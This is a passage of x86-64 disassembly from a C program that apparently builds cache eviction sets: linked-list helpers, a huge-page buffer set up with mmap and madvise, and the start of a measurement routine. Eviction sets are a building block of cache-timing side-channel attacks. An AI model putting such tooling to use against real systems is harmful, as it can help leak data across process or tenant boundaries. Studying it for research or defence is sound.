    16d1:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    16d5:	48 c1 e0 06          	shl    $0x6,%rax
    16d9:	48 89 c2             	mov    %rax,%rdx
    16dc:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    16e0:	48 01 d0             	add    %rdx,%rax
    16e3:	48 83 c0 18          	add    $0x18,%rax
    16e7:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    16eb:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
    16f2:	eb 20                	jmp    1714 <list_init+0x157>
    16f4:	8b 45 dc             	mov    -0x24(%rbp),%eax
    16f7:	48 98                	cltq
    16f9:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    1700:	00 
    1701:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1705:	48 8d 1c 02          	lea    (%rdx,%rax,1),%rbx
    1709:	e8 62 fa ff ff       	call   1170 <rand@plt>
    170e:	89 03                	mov    %eax,(%rbx)
    1710:	83 45 dc 01          	addl   $0x1,-0x24(%rbp)
    1714:	83 7d dc 09          	cmpl   $0x9,-0x24(%rbp)
    1718:	7e da                	jle    16f4 <list_init+0x137>
    171a:	48 83 45 e0 01       	addq   $0x1,-0x20(%rbp)
    171f:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1723:	48 c1 e8 06          	shr    $0x6,%rax
    1727:	48 39 45 e0          	cmp    %rax,-0x20(%rbp)
    172b:	0f 82 19 ff ff ff    	jb     164a <list_init+0x8d>
    1731:	90                   	nop
    1732:	90                   	nop
    1733:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    1737:	c9                   	leave
    1738:	c3                   	ret

0000000000001739 <list_push>:
    1739:	55                   	push   %rbp
    173a:	48 89 e5             	mov    %rsp,%rbp
    173d:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1741:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    1745:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
    174a:	74 42                	je     178e <list_push+0x55>
    174c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1750:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    1757:	00 
    1758:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    175c:	48 8b 10             	mov    (%rax),%rdx
    175f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1763:	48 89 10             	mov    %rdx,(%rax)
    1766:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    176a:	48 8b 00             	mov    (%rax),%rax
    176d:	48 85 c0             	test   %rax,%rax
    1770:	74 0f                	je     1781 <list_push+0x48>
    1772:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1776:	48 8b 00             	mov    (%rax),%rax
    1779:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    177d:	48 89 50 08          	mov    %rdx,0x8(%rax)
    1781:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1785:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    1789:	48 89 10             	mov    %rdx,(%rax)
    178c:	eb 01                	jmp    178f <list_push+0x56>
    178e:	90                   	nop
    178f:	5d                   	pop    %rbp
    1790:	c3                   	ret

0000000000001791 <list_append>:
    1791:	55                   	push   %rbp
    1792:	48 89 e5             	mov    %rsp,%rbp
    1795:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1799:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    179d:	48 83 7d e0 00       	cmpq   $0x0,-0x20(%rbp)
    17a2:	0f 84 a3 00 00 00    	je     184b <list_append+0xba>
    17a8:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
    17ad:	75 24                	jne    17d3 <list_append+0x42>
    17af:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    17b3:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    17ba:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    17be:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    17c5:	00 
    17c6:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    17ca:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    17ce:	48 89 10             	mov    %rdx,(%rax)
    17d1:	eb 79                	jmp    184c <list_append+0xbb>
    17d3:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    17d7:	48 8b 00             	mov    (%rax),%rax
    17da:	48 85 c0             	test   %rax,%rax
    17dd:	75 24                	jne    1803 <list_append+0x72>
    17df:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    17e3:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    17ea:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    17ee:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    17f5:	00 
    17f6:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    17fa:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    17fe:	48 89 10             	mov    %rdx,(%rax)
    1801:	eb 49                	jmp    184c <list_append+0xbb>
    1803:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1807:	48 8b 00             	mov    (%rax),%rax
    180a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    180e:	eb 0b                	jmp    181b <list_append+0x8a>
    1810:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1814:	48 8b 00             	mov    (%rax),%rax
    1817:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    181b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    181f:	48 8b 00             	mov    (%rax),%rax
    1822:	48 85 c0             	test   %rax,%rax
    1825:	75 e9                	jne    1810 <list_append+0x7f>
    1827:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    182b:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    182f:	48 89 10             	mov    %rdx,(%rax)
    1832:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1836:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    183a:	48 89 50 08          	mov    %rdx,0x8(%rax)
    183e:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1842:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    1849:	eb 01                	jmp    184c <list_append+0xbb>
    184b:	90                   	nop
    184c:	5d                   	pop    %rbp
    184d:	c3                   	ret

000000000000184e <list_pop>:
    184e:	55                   	push   %rbp
    184f:	48 89 e5             	mov    %rsp,%rbp
    1852:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1856:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
    185b:	74 09                	je     1866 <list_pop+0x18>
    185d:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1861:	48 8b 00             	mov    (%rax),%rax
    1864:	eb 05                	jmp    186b <list_pop+0x1d>
    1866:	b8 00 00 00 00       	mov    $0x0,%eax
    186b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    186f:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    1874:	75 07                	jne    187d <list_pop+0x2f>
    1876:	b8 00 00 00 00       	mov    $0x0,%eax
    187b:	eb 44                	jmp    18c1 <list_pop+0x73>
    187d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1881:	48 8b 00             	mov    (%rax),%rax
    1884:	48 85 c0             	test   %rax,%rax
    1887:	74 0f                	je     1898 <list_pop+0x4a>
    1889:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    188d:	48 8b 00             	mov    (%rax),%rax
    1890:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    1897:	00 
    1898:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    189c:	48 8b 10             	mov    (%rax),%rdx
    189f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    18a3:	48 89 10             	mov    %rdx,(%rax)
    18a6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    18aa:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    18b1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    18b5:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    18bc:	00 
    18bd:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    18c1:	5d                   	pop    %rbp
    18c2:	c3                   	ret

00000000000018c3 <list_get>:
    18c3:	55                   	push   %rbp
    18c4:	48 89 e5             	mov    %rsp,%rbp
    18c7:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    18cb:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    18cf:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    18d3:	48 8b 00             	mov    (%rax),%rax
    18d6:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    18da:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    18e1:	00 
    18e2:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    18e7:	75 17                	jne    1900 <list_get+0x3d>
    18e9:	b8 00 00 00 00       	mov    $0x0,%eax
    18ee:	eb 33                	jmp    1923 <list_get+0x60>
    18f0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    18f4:	48 8b 00             	mov    (%rax),%rax
    18f7:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    18fb:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    1900:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    1905:	74 0d                	je     1914 <list_get+0x51>
    1907:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    190b:	48 8b 00             	mov    (%rax),%rax
    190e:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    1912:	72 dc                	jb     18f0 <list_get+0x2d>
    1914:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1918:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    191c:	48 89 10             	mov    %rdx,(%rax)
    191f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1923:	5d                   	pop    %rbp
    1924:	c3                   	ret

0000000000001925 <list_take>:
    1925:	55                   	push   %rbp
    1926:	48 89 e5             	mov    %rsp,%rbp
    1929:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    192d:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    1931:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1935:	48 8b 00             	mov    (%rax),%rax
    1938:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    193c:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    1943:	00 
    1944:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    1949:	75 1a                	jne    1965 <list_take+0x40>
    194b:	b8 00 00 00 00       	mov    $0x0,%eax
    1950:	e9 9b 00 00 00       	jmp    19f0 <list_take+0xcb>
    1955:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1959:	48 8b 00             	mov    (%rax),%rax
    195c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1960:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    1965:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    196a:	74 0d                	je     1979 <list_take+0x54>
    196c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1970:	48 8b 00             	mov    (%rax),%rax
    1973:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    1977:	72 dc                	jb     1955 <list_take+0x30>
    1979:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    197e:	75 07                	jne    1987 <list_take+0x62>
    1980:	b8 00 00 00 00       	mov    $0x0,%eax
    1985:	eb 69                	jmp    19f0 <list_take+0xcb>
    1987:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    198b:	48 8b 00             	mov    (%rax),%rax
    198e:	48 85 c0             	test   %rax,%rax
    1991:	74 13                	je     19a6 <list_take+0x81>
    1993:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1997:	48 8b 00             	mov    (%rax),%rax
    199a:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    199e:	48 8b 52 08          	mov    0x8(%rdx),%rdx
    19a2:	48 89 50 08          	mov    %rdx,0x8(%rax)
    19a6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    19aa:	48 8b 40 08          	mov    0x8(%rax),%rax
    19ae:	48 85 c0             	test   %rax,%rax
    19b1:	74 14                	je     19c7 <list_take+0xa2>
    19b3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    19b7:	48 8b 40 08          	mov    0x8(%rax),%rax
    19bb:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    19bf:	48 8b 12             	mov    (%rdx),%rdx
    19c2:	48 89 10             	mov    %rdx,(%rax)
    19c5:	eb 0e                	jmp    19d5 <list_take+0xb0>
    19c7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    19cb:	48 8b 10             	mov    (%rax),%rdx
    19ce:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    19d2:	48 89 10             	mov    %rdx,(%rax)
    19d5:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    19d9:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    19e0:	00 
    19e1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    19e5:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    19ec:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    19f0:	5d                   	pop    %rbp
    19f1:	c3                   	ret

00000000000019f2 <list_shuffle>:
    19f2:	55                   	push   %rbp
    19f3:	48 89 e5             	mov    %rsp,%rbp
    19f6:	48 83 ec 30          	sub    $0x30,%rsp
    19fa:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    19fe:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1a02:	48 8b 00             	mov    (%rax),%rax
    1a05:	48 85 c0             	test   %rax,%rax
    1a08:	0f 84 06 01 00 00    	je     1b14 <list_shuffle+0x122>
    1a0e:	bf 08 00 00 00       	mov    $0x8,%edi
    1a13:	e8 c8 f6 ff ff       	call   10e0 <malloc@plt>
    1a18:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    1a1c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1a20:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    1a27:	48 c7 45 e8 ff ff ff 	movq   $0xffffffffffffffff,-0x18(%rbp)
    1a2e:	ff 
    1a2f:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
    1a33:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1a37:	48 89 d6             	mov    %rdx,%rsi
    1a3a:	48 89 c7             	mov    %rax,%rdi
    1a3d:	e8 81 fe ff ff       	call   18c3 <list_get>
    1a42:	48 8b 05 9f 46 00 00 	mov    0x469f(%rip),%rax        # 60e8 <lfsr>
    1a49:	48 85 c0             	test   %rax,%rax
    1a4c:	75 60                	jne    1aae <list_shuffle+0xbc>
    1a4e:	e8 0b fa ff ff       	call   145e <lfsr_create>
    1a53:	48 89 05 8e 46 00 00 	mov    %rax,0x468e(%rip)        # 60e8 <lfsr>
    1a5a:	eb 52                	jmp    1aae <list_shuffle+0xbc>
    1a5c:	48 8d 05 85 46 00 00 	lea    0x4685(%rip),%rax        # 60e8 <lfsr>
    1a63:	48 89 c7             	mov    %rax,%rdi
    1a66:	e8 05 fa ff ff       	call   1470 <lfsr_rand>
    1a6b:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
    1a6f:	48 8d 4e ff          	lea    -0x1(%rsi),%rcx
    1a73:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
    1a77:	ba 00 00 00 00       	mov    $0x0,%edx
    1a7c:	48 f7 f6             	div    %rsi
    1a7f:	48 89 d1             	mov    %rdx,%rcx
    1a82:	48 89 c8             	mov    %rcx,%rax
    1a85:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    1a89:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
    1a8d:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1a91:	48 89 d6             	mov    %rdx,%rsi
    1a94:	48 89 c7             	mov    %rax,%rdi
    1a97:	e8 89 fe ff ff       	call   1925 <list_take>
    1a9c:	48 89 c2             	mov    %rax,%rdx
    1a9f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1aa3:	48 89 d6             	mov    %rdx,%rsi
    1aa6:	48 89 c7             	mov    %rax,%rdi
    1aa9:	e8 e3 fc ff ff       	call   1791 <list_append>
    1aae:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1ab2:	48 85 c0             	test   %rax,%rax
    1ab5:	75 a5                	jne    1a5c <list_shuffle+0x6a>
    1ab7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1abb:	48 8b 00             	mov    (%rax),%rax
    1abe:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1ac2:	eb 17                	jmp    1adb <list_shuffle+0xe9>
    1ac4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1ac8:	48 89 c7             	mov    %rax,%rdi
    1acb:	e8 7d f8 ff ff       	call   134d <my_access>
    1ad0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1ad4:	48 8b 00             	mov    (%rax),%rax
    1ad7:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1adb:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1adf:	48 8b 00             	mov    (%rax),%rax
    1ae2:	48 85 c0             	test   %rax,%rax
    1ae5:	75 dd                	jne    1ac4 <list_shuffle+0xd2>
    1ae7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1aeb:	48 8b 10             	mov    (%rax),%rdx
    1aee:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1af2:	48 89 10             	mov    %rdx,(%rax)
    1af5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1af9:	48 8b 00             	mov    (%rax),%rax
    1afc:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    1b00:	48 89 50 08          	mov    %rdx,0x8(%rax)
    1b04:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1b08:	48 8b 10             	mov    (%rax),%rdx
    1b0b:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1b0f:	48 89 10             	mov    %rdx,(%rax)
    1b12:	eb 01                	jmp    1b15 <list_shuffle+0x123>
    1b14:	90                   	nop
    1b15:	c9                   	leave
    1b16:	c3                   	ret

0000000000001b17 <list_print>:
    1b17:	55                   	push   %rbp
    1b18:	48 89 e5             	mov    %rsp,%rbp
    1b1b:	48 83 ec 20          	sub    $0x20,%rsp
    1b1f:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1b23:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
    1b28:	74 7f                	je     1ba9 <list_print+0x92>
    1b2a:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1b2e:	48 8b 00             	mov    (%rax),%rax
    1b31:	48 85 c0             	test   %rax,%rax
    1b34:	74 76                	je     1bac <list_print+0x95>
    1b36:	48 8d 05 cb 24 00 00 	lea    0x24cb(%rip),%rax        # 4008 <_IO_stdin_used+0x8>
    1b3d:	48 89 c7             	mov    %rax,%rdi
    1b40:	e8 fb f4 ff ff       	call   1040 <puts@plt>
    1b45:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    1b4c:	00 
    1b4d:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1b51:	48 8b 00             	mov    (%rax),%rax
    1b54:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1b58:	eb 46                	jmp    1ba0 <list_print+0x89>
    1b5a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1b5e:	48 8b 08             	mov    (%rax),%rcx
    1b61:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    1b66:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    1b6a:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1b6e:	48 89 c6             	mov    %rax,%rsi
    1b71:	48 8d 05 ab 24 00 00 	lea    0x24ab(%rip),%rax        # 4023 <_IO_stdin_used+0x23>
    1b78:	48 89 c7             	mov    %rax,%rdi
    1b7b:	b8 00 00 00 00       	mov    $0x0,%eax
    1b80:	e8 0b f5 ff ff       	call   1090 <printf@plt>
    1b85:	48 8b 05 34 45 00 00 	mov    0x4534(%rip),%rax        # 60c0 <conf>
    1b8c:	48 8b 00             	mov    (%rax),%rax
    1b8f:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    1b93:	73 1a                	jae    1baf <list_print+0x98>
    1b95:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1b99:	48 8b 00             	mov    (%rax),%rax
    1b9c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1ba0:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    1ba5:	75 b3                	jne    1b5a <list_print+0x43>
    1ba7:	eb 07                	jmp    1bb0 <list_print+0x99>
    1ba9:	90                   	nop
    1baa:	eb 04                	jmp    1bb0 <list_print+0x99>
    1bac:	90                   	nop
    1bad:	eb 01                	jmp    1bb0 <list_print+0x99>
    1baf:	90                   	nop
    1bb0:	c9                   	leave
    1bb1:	c3                   	ret

0000000000001bb2 <init_evset>:
    1bb2:	55                   	push   %rbp
    1bb3:	48 89 e5             	mov    %rsp,%rbp
    1bb6:	48 83 ec 10          	sub    $0x10,%rsp
    1bba:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1bbe:	bf 00 ca 9a 3b       	mov    $0x3b9aca00,%edi
    1bc3:	e8 47 f8 ff ff       	call   140f <wait>
    1bc8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1bcc:	48 89 05 ed 44 00 00 	mov    %rax,0x44ed(%rip)        # 60c0 <conf>
    1bd3:	48 c7 05 fa 44 00 00 	movq   $0x400000,0x44fa(%rip)        # 60d8 <buffer_size>
    1bda:	00 00 40 00 
    1bde:	48 8b 05 f3 44 00 00 	mov    0x44f3(%rip),%rax        # 60d8 <buffer_size>
    1be5:	41 b9 00 00 00 00    	mov    $0x0,%r9d
    1beb:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
    1bf1:	b9 22 00 04 00       	mov    $0x40022,%ecx
    1bf6:	ba 03 00 00 00       	mov    $0x3,%edx
    1bfb:	48 89 c6             	mov    %rax,%rsi
    1bfe:	bf 00 00 00 00       	mov    $0x0,%edi
    1c03:	e8 78 f4 ff ff       	call   1080 <mmap@plt>
    1c08:	48 89 05 c1 44 00 00 	mov    %rax,0x44c1(%rip)        # 60d0 <buffer>
    1c0f:	48 8b 05 ba 44 00 00 	mov    0x44ba(%rip),%rax        # 60d0 <buffer>
    1c16:	ba 0e 00 00 00       	mov    $0xe,%edx
    1c1b:	be 00 00 20 00       	mov    $0x200000,%esi
    1c20:	48 89 c7             	mov    %rax,%rdi
    1c23:	e8 e8 f4 ff ff       	call   1110 <madvise@plt>
    1c28:	83 f8 ff             	cmp    $0xffffffff,%eax
    1c2b:	75 14                	jne    1c41 <init_evset+0x8f>
    1c2d:	48 8d 05 fc 23 00 00 	lea    0x23fc(%rip),%rax        # 4030 <_IO_stdin_used+0x30>
    1c34:	48 89 c7             	mov    %rax,%rdi
    1c37:	e8 04 f4 ff ff       	call   1040 <puts@plt>
    1c3c:	e9 85 00 00 00       	jmp    1cc6 <init_evset+0x114>
    1c41:	48 8d 05 88 44 00 00 	lea    0x4488(%rip),%rax        # 60d0 <buffer>
    1c48:	48 89 05 91 44 00 00 	mov    %rax,0x4491(%rip)        # 60e0 <buffer_ptr>
    1c4f:	48 8b 15 82 44 00 00 	mov    0x4482(%rip),%rdx        # 60d8 <buffer_size>
    1c56:	48 8b 05 73 44 00 00 	mov    0x4473(%rip),%rax        # 60d0 <buffer>
    1c5d:	48 89 d6             	mov    %rdx,%rsi
    1c60:	48 89 c7             	mov    %rax,%rdi
    1c63:	e8 55 f9 ff ff       	call   15bd <list_init>
    1c68:	48 8b 05 51 44 00 00 	mov    0x4451(%rip),%rax        # 60c0 <conf>
    1c6f:	48 8b 00             	mov    (%rax),%rax
    1c72:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1c79:	00 
    1c7a:	48 8b 05 47 44 00 00 	mov    0x4447(%rip),%rax        # 60c8 <evsets>
    1c81:	48 89 d6             	mov    %rdx,%rsi
    1c84:	48 89 c7             	mov    %rax,%rdi
    1c87:	e8 64 f4 ff ff       	call   10f0 <realloc@plt>
    1c8c:	48 89 05 35 44 00 00 	mov    %rax,0x4435(%rip)        # 60c8 <evsets>
    1c93:	48 8b 05 2e 44 00 00 	mov    0x442e(%rip),%rax        # 60c8 <evsets>
    1c9a:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    1ca1:	48 8b 15 28 44 00 00 	mov    0x4428(%rip),%rdx        # 60d0 <buffer>
    1ca8:	48 8b 05 19 44 00 00 	mov    0x4419(%rip),%rax        # 60c8 <evsets>
    1caf:	48 89 c6             	mov    %rax,%rsi
    1cb2:	48 8d 05 87 23 00 00 	lea    0x2387(%rip),%rax        # 4040 <_IO_stdin_used+0x40>
    1cb9:	48 89 c7             	mov    %rax,%rdi
    1cbc:	b8 00 00 00 00       	mov    $0x0,%eax
    1cc1:	e8 ca f3 ff ff       	call   1090 <printf@plt>
    1cc6:	c9                   	leave
    1cc7:	c3                   	ret

0000000000001cc8 <find_evset>:
    1cc8:	55                   	push   %rbp
    1cc9:	48 89 e5             	mov    %rsp,%rbp
    1ccc:	48 83 ec 30          	sub    $0x30,%rsp
    1cd0:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    1cd4:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
    1cd8:	48 8b 05 19 44 00 00 	mov    0x4419(%rip),%rax        # 60f8 <msrmts>
    1cdf:	48 85 c0             	test   %rax,%rax
    1ce2:	74 1a                	je     1cfe <find_evset+0x36>
    1ce4:	48 8b 05 0d 44 00 00 	mov    0x440d(%rip),%rax        # 60f8 <msrmts>
    1ceb:	48 89 c7             	mov    %rax,%rdi
    1cee:	e8 3d f3 ff ff       	call   1030 <free@plt>
    1cf3:	48 c7 05 fa 43 00 00 	movq   $0x0,0x43fa(%rip)        # 60f8 <msrmts>
    1cfa:	00 00 00 00 
    1cfe:	48 8b 05 f3 43 00 00 	mov    0x43f3(%rip),%rax        # 60f8 <msrmts>
    1d05:	be 40 1f 00 00       	mov    $0x1f40,%esi
    1d0a:	48 89 c7             	mov    %rax,%rdi
    1d0d:	e8 de f3 ff ff       	call   10f0 <realloc@plt>
    1d12:	48 89 05 df 43 00 00 	mov    %rax,0x43df(%rip)        # 60f8 <msrmts>
    1d19:	48 8d 05 4f 23 00 00 	lea    0x234f(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    1d20:	48 89 c7             	mov    %rax,%rdi
    1d23:	e8 18 f3 ff ff       	call   1040 <puts@plt>
    1d28:	48 8b 05 a1 43 00 00 	mov    0x43a1(%rip),%rax        # 60d0 <buffer>
    1d2f:	48 85 c0             	test   %rax,%rax
    1d32:	74 0c                	je     1d40 <find_evset+0x78>
    1d34:	48 8b 05 8d 43 00 00 	mov    0x438d(%rip),%rax        # 60c8 <evsets>
    1d3b:	48 85 c0             	test   %rax,%rax
    1d3e:	75 25                	jne    1d65 <find_evset+0x9d>
    1d40:	48 8d 05 2a 23 00 00 	lea    0x232a(%rip),%rax        # 4071 <_IO_stdin_used+0x71>
    1d47:	48 89 c7             	mov    %rax,%rdi
    1d4a:	e8 f1 f2 ff ff       	call   1040 <puts@plt>
    1d4f:	b8 00 00 00 00       	mov    $0x0,%eax
    1d54:	e8 e3 01 00 00       	call   1f3c <close_evsets>
    1d59:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1d5d:	48 89 c7             	mov    %rax,%rdi
    1d60:	e8 4d fe ff ff       	call   1bb2 <init_evset>
    1d65:	bf 00 ca 9a 3b       	mov    $0x3b9aca00,%edi
    1d6a:	e8 a0 f6 ff ff       	call   140f <wait>
    1d6f:	48 8d 05 f9 22 00 00 	lea    0x22f9(%rip),%rax        # 406f <_IO_stdin_used+0x6f>
    1d76:	48 89 c7             	mov    %rax,%rdi
    1d79:	e8 c2 f2 ff ff       	call   1040 <puts@plt>
    1d7e:	c7 45 fc ff 07 00 00 	movl   $0x7ff,-0x4(%rbp)
    1d85:	e9 38 01 00 00       	jmp    1ec2 <find_evset+0x1fa>
    1d8a:	48 8d 05 f2 22 00 00 	lea    0x22f2(%rip),%rax        # 4083 <_IO_stdin_used+0x83>
    1d91:	48 89 c7             	mov    %rax,%rdi
    1d94:	e8 a7 f2 ff ff       	call   1040 <puts@plt>
    1d99:	48 8b 05 20 43 00 00 	mov    0x4320(%rip),%rax        # 60c0 <conf>
    1da0:	48 8b 00             	mov    (%rax),%rax
    1da3:	83 e8 01             	sub    $0x1,%eax
    1da6:	89 45 f8             	mov    %eax,-0x8(%rbp)
    1da9:	eb 5b                	jmp    1e06 <find_evset+0x13e>
    1dab:	8b 45 fc             	mov    -0x4(%rbp),%eax
    1dae:	48 98                	cltq
    1db0:	8b 55 f8             	mov    -0x8(%rbp),%edx
    1db3:	48 63 d2             	movslq %edx,%rdx
    1db6:	48 c1 e2 0b          	shl    $0xb,%rdx
    1dba:	48 01 c2             	add    %rax,%rdx
    1dbd:	b8 ff 07 00 00       	mov    $0x7ff,%eax
    1dc2:	2b 45 fc             	sub    -0x4(%rbp),%eax
    1dc5:	0f af 45 f8          	imul   -0x8(%rbp),%eax
    1dc9:	48 98                	cltq
    1dcb:	48 29 c2             	sub    %rax,%rdx
    1dce:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
